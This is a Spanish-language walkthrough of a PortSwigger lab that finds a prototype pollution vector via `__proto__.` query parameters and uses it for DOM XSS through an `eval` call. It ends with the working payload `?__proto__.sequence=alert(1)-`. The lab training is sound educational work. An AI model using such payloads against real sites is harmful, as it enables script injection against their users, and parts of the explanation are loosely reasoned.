---
description: >-
  https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector
---

# Lab 3: DOM XSS via an alternative prototype pollution vector

Al validar la siguiente carga no funciona:

```
/?__proto__[foo]=bar
```

Y se puede apreciar al ejecutar lo siguiente desde el devtools: `Object.prototype`

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Por lo anterior, se envia otra carga:

```
/?__proto__.hacked=gerh
```

Y se logra ver que si funciono ejecutando desde el devtools: `Object.prototype`

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo anterior, se procede a analizar el codigo fuente de JS:

```javascript
async function logQuery(url, params) {
    try {
        await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    } catch(e) {
        console.error("Failed storing query");
    }
}

async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}

window.addEventListener("load", searchLogger);
```

El código proporcionado es susceptible a _prototype pollution_ debido a la forma en que se maneja el objeto `params` y la posibilidad de que se manipule de manera insegura. Aquí hay un análisis detallado de las razones:

1.  **Manipulación del objeto `params`**:

    ```javascript
    await fetch(url, {method: "post", keepalive: true, body: JSON.stringify(params)});
    ```

    El objeto `params` que se envía en el cuerpo de la solicitud podría ser manipulado por un atacante. Si el `params` contiene propiedades que alteran el prototipo de objetos nativos como `Object.prototype`, podría introducir propiedades no deseadas en todos los objetos de ese tipo en la aplicación.
2.  **Uso de `eval`**:

    ```javascript
    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
    ```

    El uso de `eval` con datos potencialmente controlados por el usuario (`manager.sequence`) es extremadamente peligroso. Esto permite la ejecución de código arbitrario, lo que podría explotarse para modificar el prototipo de objetos globales.
3.  **Dependencia de `$.parseParams`**:

    ```javascript
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
            }};
    ```

    La función `$.parseParams` podría ser manipulada para introducir propiedades maliciosas en `params`. Si `params` se construye a partir de una cadena de consulta controlada por el usuario, esto abre la puerta a la contaminación del prototipo.

Por lo anterior, enviamos la siguiente carga:

```
/?__proto__.sequence=alert(1)
```

Y lo anterior, genero el siguiente error:

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

La anterior payload no funciono y no genero el XSS.

Si analizamos con el debugger, se logra apreciar que el payload se le esta agregando "1" al final:

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Lo anterior es debido a la linea 16 que suma la variable mas "1".

Teniendo en cuenta lo anterior, enviaremos una carga adicionando el caracter "-".

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

La carga utilizada para desplegar el XSS fue la siguiente:

```
?__proto__.sequence=alert(1)-
```

